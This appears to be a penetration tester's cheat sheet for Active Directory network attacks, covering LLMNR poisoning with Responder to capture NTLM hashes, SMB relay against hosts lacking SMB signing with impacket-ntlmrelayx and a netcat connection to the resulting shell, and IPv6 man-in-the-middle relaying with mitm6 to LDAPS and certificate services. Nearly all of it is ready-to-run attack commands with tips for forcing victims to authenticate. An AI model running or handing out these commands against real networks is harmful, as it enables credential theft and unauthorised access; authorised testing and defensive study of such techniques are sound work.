## LLMNR Poisoning
[Github - Responder](https://github.com/lgandx/Responder) )
**Note:** Use to capture NTLM hashes.
###### Run Responder
`sudo responder -dwv -I tun0`
###### An Event Occurs
**Note:** We can wait for a user to trigger an event. If we have access to a machine but not the password, we can  [[0.6 File Transfer#Start attacker SMB Share|set up a share]] on our device and interact with it as the target to trigger the hash capture.

---
## SMB Relay
###### Identify Hosts with SMB Signing Disabled
`nmap --script=smb2-security-mode.nse  -p445 192.168.1.0/24`
**Note:** Put all susceptible hosts into a targets.txt file.
###### Edit Responder.conf
**Note:** Set SMB and HTTP to `Off`
`SMB = Off`
`HTTP = Off`
###### Start Responder
`sudo responder -dwv -I tun0`
###### Start Relay
`impacket-ntlmrelayx -tf targets.txt -smb2support -i`
###### An Event Occurs
**Note:** We can wait for a user to trigger an event. In some cases, services may make requests to external shares, or we can force them to (like with MSSQL xp_dirtree). In this instance, we may be able to force an event in a similar way to the LLMNR Poisoning attack.
###### Connect to the Session
`nc <target-ip> 11000`
**Note:** Typically, a successful authentication will result in an interactive shell being accessible on port 11000 or up.

---
## IPv6 MitM
[Github - MitM6](https://github.com/dirkjanm/mitm6)
**Note:** Do not run for longer than 5 minute periods.
###### Set up Relay
`impacket-ntlmrelayx -6 -t ldaps://<domain-controller-ip> -wh fakewpad.domain.local -l loot --adcs`
###### Run MitM6
`sudo mitm6 -d <domain.com>`